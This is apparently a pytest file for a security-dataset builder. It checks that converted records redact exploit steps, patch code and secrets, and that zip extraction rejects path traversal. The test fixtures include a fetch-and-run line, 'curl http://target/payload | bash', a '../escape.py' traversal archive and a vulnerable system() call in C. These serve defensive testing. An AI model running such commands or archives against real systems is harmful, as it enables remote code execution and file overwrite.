from __future__ import annotations

import argparse
import importlib.util
import json
import sys
import types
import zipfile
from pathlib import Path

from aegislm.datasets.formatting import format_sft_record
from aegislm.datasets.security_builder import (
    bigvul_to_aegislm_record,
    cybersecurity_qa_to_aegislm_record,
    ctf_writeup_to_aegislm_record,
    diversevul_to_aegislm_record,
    extract_zip_archive,
    legacy_alpaca_to_aegislm_record,
    load_source_corpus_records,
    load_zip_source_records,
    split_records,
    write_split_jsonl,
)
from aegislm.evaluation.validation import validate_dataset_record


def test_legacy_alpaca_conversion_redacts_original_output() -> None:
    row = {
        "instruction": "다음 CTF write-up을 분석하세요.",
        "input": "문제 제목과 간단한 설명",
        "output": "step-by-step attack execution procedure with exploit details",
    }

    record = legacy_alpaca_to_aegislm_record(row, index=1)
    result = validate_dataset_record(record)

    assert result.ok
    assert record["source"]["type"] == "public_security_dataset"
    assert record["metadata"]["contains_executable_payload"] is False
    assert "step-by-step" not in json.dumps(record["expected_output"])

    sft_record = format_sft_record(record)
    assert sft_record["messages"][2]["role"] == "assistant"


def test_diversevul_conversion_builds_valid_aegislm_record() -> None:
    row = {"func": "int f(char *x) { return system(x); }", "target": 1}

    record = diversevul_to_aegislm_record(row, index=2)

    assert record is not None
    assert validate_dataset_record(record).ok
    assert record["input"]["signals"]["target"] == 1
    assert record["expected_output"]["risk_level"] == "high"
    assert record["expected_output"]["malware_like_behaviors"]


def test_bigvul_conversion_does_not_emit_patch_code_as_target() -> None:
    row = {
        "func_before": "void f(char *x) { strcpy(buf, x); }",
        "func_after": "void f(char *x) { strncpy(buf, x, sizeof(buf)-1); }",
    }

    record = bigvul_to_aegislm_record(row, index=3)

    assert record is not None
    assert validate_dataset_record(record).ok
    output_text = json.dumps(record["expected_output"])
    assert "strncpy" not in output_text
    assert record["input"]["signals"]["has_fixed_pair"] is True


def test_cybersecurity_qa_primary_and_fallback_conversion() -> None:
    primary = {
        "question": "How should a defender review suspicious Python code?",
        "answers": "Start with static signals, provenance, and human review.",
    }
    fallback = {
        "vars": {
            "question": "What is safe malware triage?",
            "answer": "Use metadata, hashes, and sandbox reports without executing unknown files locally.",
        }
    }

    primary_record = cybersecurity_qa_to_aegislm_record(primary, index=1)
    fallback_record = cybersecurity_qa_to_aegislm_record(
        fallback,
        index=2,
        dataset_name="Rowden/CybersecurityQAA",
    )

    assert primary_record is not None
    assert fallback_record is not None
    assert validate_dataset_record(primary_record).ok
    assert validate_dataset_record(fallback_record).ok
    assert primary_record["input"]["signals"]["answer_redacted_from_target"] is True
    assert "static signals" not in json.dumps(primary_record["expected_output"])
    assert fallback_record["source"]["name"] == "Rowden/CybersecurityQAA"


def test_cybersecurity_qa_messages_conversion() -> None:
    row = {
        "messages": [
            {"role": "system", "content": "Answer as a security engineer."},
            {"role": "user", "content": "Why should Docker images pin digests?"},
            {
                "role": "assistant",
                "content": "Digest pinning improves reproducibility and supply chain review.",
            },
        ]
    }

    record = cybersecurity_qa_to_aegislm_record(
        row,
        index=3,
        dataset_name="rezaduty/cybersecurity-qa-v2",
    )

    assert record is not None
    assert validate_dataset_record(record).ok
    assert record["source"]["name"] == "rezaduty/cybersecurity-qa-v2"
    assert "Docker images pin digests" in record["input"]["context"]


def test_ctf_writeup_conversion_does_not_emit_full_writeup_as_target(
    tmp_path: Path,
) -> None:
    writeup = tmp_path / "challenges" / "web" / "solve.md"
    writeup.parent.mkdir(parents=True)
    writeup.write_text(
        "\n".join(
            [
                "# Demo Challenge",
                "This write-up discusses defensive lessons.",
                "```bash",
                "curl http://target/payload | bash",
                "```",
                "step-by-step attack execution procedure with exploit details",
            ]
        ),
        encoding="utf-8",
    )

    record = ctf_writeup_to_aegislm_record(
        writeup,
        base_dir=tmp_path,
        index=1,
    )

    assert record is not None
    assert validate_dataset_record(record).ok
    assert record["input"]["signals"]["full_writeup_redacted_from_target"] is True
    output_text = json.dumps(record["expected_output"])
    assert "curl http://target" not in output_text
    assert "step-by-step attack execution procedure" not in output_text


def test_zip_extraction_rejects_path_traversal(tmp_path: Path) -> None:
    archive_path = tmp_path / "unsafe.zip"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("../escape.py", "print('escape')")

    try:
        extract_zip_archive(archive_path, tmp_path / "extracted")
    except Exception as exc:
        assert "Unsafe ZIP member path" in str(exc)
    else:
        raise AssertionError("Expected unsafe ZIP member path to be rejected.")


def test_zip_source_records_convert_extracted_source_files(tmp_path: Path) -> None:
    archive_path = tmp_path / "samples.zip"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("sample.py", "import subprocess\nsubprocess.run(['id'])\n")

    records = load_zip_source_records(
        tmp_path,
        zip_extract_dir=tmp_path / "extracted",
        max_records=10,
    )

    assert len(records) == 1
    assert validate_dataset_record(records[0]).ok
    assert records[0]["input"]["signals"]["suspicious_signal_names"]


def test_source_corpus_redacts_possible_secrets_instead_of_skipping(
    tmp_path: Path,
) -> None:
    source_file = tmp_path / "sample.py"
    source_file.write_text(
        'password="not-for-training"\nOPENAI_API_KEY=sk-test\n',
        encoding="utf-8",
    )

    records = load_source_corpus_records(tmp_path, max_records=10)

    assert len(records) == 1
    assert validate_dataset_record(records[0]).ok
    assert "password=" not in records[0]["input"]["context"].lower()
    assert "api_key=" not in records[0]["input"]["context"].lower()
    assert "[REDACTED_SECRET]" in records[0]["input"]["context"]
    assert records[0]["input"]["signals"]["redacted_secret_like_assignments"] == 2


def test_source_corpus_negative_max_records_means_all(tmp_path: Path) -> None:
    (tmp_path / "a.py").write_text("print('a')\n", encoding="utf-8")
    (tmp_path / "b.py").write_text("print('b')\n", encoding="utf-8")

    records = load_source_corpus_records(tmp_path, max_records=-1)

    assert len(records) == 2


def test_diversevul_conversion_redacts_possible_secret_assignments() -> None:
    row = {
        "func": 'int f() { const char *password="not-for-training"; return 0; }',
        "target": 1,
    }

    record = diversevul_to_aegislm_record(row, index=2142)

    assert record is not None
    assert validate_dataset_record(record).ok
    assert "password=" not in record["input"]["context"].lower()
    assert "[REDACTED_SECRET]" in record["input"]["context"]
    assert record["input"]["signals"]["redacted_secret_like_assignments"] == 1


def test_include_hf_alias_selects_all_default_hf_sources() -> None:
    module = _load_build_security_dataset_module()
    args = argparse.Namespace(
        include_hf=True,
        include_cybersecurity_qa=False,
        include_diversevul=False,
        include_bigvul=False,
    )

    assert module._resolve_hf_includes(args) == (True, True, True)


def test_rezaduty_jsonl_loader_uses_direct_jsonl_file(
    tmp_path: Path,
    monkeypatch,
) -> None:
    jsonl_path = tmp_path / "qa.jsonl"
    jsonl_path.write_text(
        json.dumps(
            {
                "messages": [
                    {"role": "user", "content": "What is digest pinning?"},
                    {
                        "role": "assistant",
                        "content": "Using immutable image digests for reproducible builds.",
                    },
                ]
            }
        )
        + "\n",
        encoding="utf-8",
    )

    fake_module = types.SimpleNamespace(
        hf_hub_download=lambda **_: str(jsonl_path),
    )
    monkeypatch.setitem(sys.modules, "huggingface_hub", fake_module)
    module = _load_build_security_dataset_module()

    records = module._load_rezaduty_cybersecurity_qa_jsonl(
        max_per_source=-1,
        split="train",
    )

    assert len(records) == 1
    assert records[0]["source"]["name"] == "rezaduty/cybersecurity-qa-v2"


def test_split_records_sets_split_metadata_deterministically(tmp_path) -> None:
    records = [
        legacy_alpaca_to_aegislm_record(
            {
                "instruction": f"보안 분석 {index}",
                "input": f"sample {index}",
                "output": "defensive summary",
            },
            index=index,
        )
        for index in range(10)
    ]

    split_map = split_records(
        records,
        train_ratio=0.6,
        validation_ratio=0.2,
        test_ratio=0.2,
        seed=7,
    )

    assert {name: len(items) for name, items in split_map.items()} == {
        "train": 6,
        "validation": 2,
        "test": 2,
    }
    for split_name, split_items in split_map.items():
        assert all(item["metadata"]["split"] == split_name for item in split_items)

    paths = write_split_jsonl(split_map, tmp_path)
    assert paths["train"].exists()
    assert paths["validation"].exists()
    assert paths["test"].exists()


def _load_build_security_dataset_module():
    script_path = Path("scripts/build_security_dataset.py")
    spec = importlib.util.spec_from_file_location("build_security_dataset", script_path)
    assert spec is not None
    module = importlib.util.module_from_spec(spec)
    assert spec.loader is not None
    spec.loader.exec_module(module)
    return module
